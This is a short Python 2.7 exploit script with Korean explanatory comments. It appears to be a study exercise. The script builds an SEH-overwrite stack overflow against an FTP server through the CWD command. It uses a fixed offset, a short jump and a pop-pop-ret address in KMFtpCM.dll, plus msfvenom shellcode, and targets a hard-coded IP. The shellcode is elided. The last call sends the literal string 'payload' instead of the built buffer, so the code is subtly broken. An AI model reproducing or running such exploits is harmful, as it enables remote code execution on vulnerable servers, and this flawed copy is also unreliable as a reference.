# ! python 2.7
# calc.exe execution -> POC의 원리 증명
# shellcode -> 코드 조각
# msfvenom - kalilinux - Metasploit
buf = " "
buf += "\x66\..."

import struct, socket
from ftplib import FTP

offset = 1037
# stack overflow 공격 감행 (우회 기법 -> 윈도우 내부의 예외 구조 처리 이용)
sehNext = struct.pack('<L', 0x90900BEB) # Short jump 0B
sheHandler = struct.pack('<L', 0x12206d9d) # PPR - KMFtpCM.dll

payload = "CWD "
payload += "A" * offset
payload += sehNext
payload += sheHandler
payload += buf # shellcode
payload += "B" * (4500-len(buf)) # 전체 길이가 4500byte 가 되어야 함

ftp = FTP("172.30.1.41")
print(ftp.login())
ftp.retrlines("payload")